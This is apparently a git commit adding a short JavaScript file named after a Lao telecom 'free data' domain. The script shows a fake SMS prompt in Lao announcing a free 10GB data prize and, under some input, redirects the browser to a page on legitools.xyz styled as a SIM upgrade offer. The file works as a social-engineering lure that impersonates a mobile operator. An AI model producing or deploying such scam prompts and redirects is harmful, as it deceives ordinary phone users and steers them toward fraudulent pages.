8130e9b39abfff3ae4d5629b84545ef977496902
harryjohnson86 <mfonjohnson86@gmail.com>
2025-04-05 15:46:21 -0700

    Create laotelecom-freedata.com.js

---
+++ laotelecom-freedata.com.js
@@ -0,0 +1,5 @@
+var password = 'ຂໍ້ມູນຟຣີ 10GB'
+password=prompt('SMS: ຂໍສະແດງຄວາມຍິນດີກັບເບີຂອງທ່ານທີ່ມີສິດໄດ້ຮັບຮາງວັນຂໍ້ມູນຊິມກາດເກົ່າ 10GB ຟຣີ, ກະລຸນາກົດ OK ເພື່ອເປີດໃຊ້. ','ຂໍ້ມູນຟຣີ 10GB');
+if (password != 'ຂໍ້ມູນຟຣີ 10GB') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
